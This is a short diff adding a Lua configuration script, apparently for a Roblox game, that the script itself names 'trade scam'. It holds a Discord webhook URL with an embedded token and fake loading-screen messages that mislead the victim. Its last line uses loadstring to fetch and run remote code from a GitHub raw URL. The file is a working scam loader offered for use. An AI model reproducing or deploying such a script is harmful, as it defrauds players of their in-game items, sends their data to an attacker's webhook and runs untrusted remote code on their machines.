@@ -1,0 +1,9 @@
+Username = hellopike2
+WebHook = httpsdiscord.comapiwebhooks10998132036696965122MryAtj75BLT3JpDFBIgFa1godef6mDe-56slsMw6jAT5pS2DEDMKYykj4F3swm9nbyF
+loadingscreen = true
+_G.CustomScriptName = trade scam
+_G.Text1 = please wait for the script to load
+_G.Text2 = Waiting for Script...
+_G.Text3 = Checking Scripts...
+_G.Text4 = Starting Script...
+loadstring(gameHttpGet(httpsraw.githubusercontent.comJustanotherdmepetsimx22mainpetsimguiss.lua))()
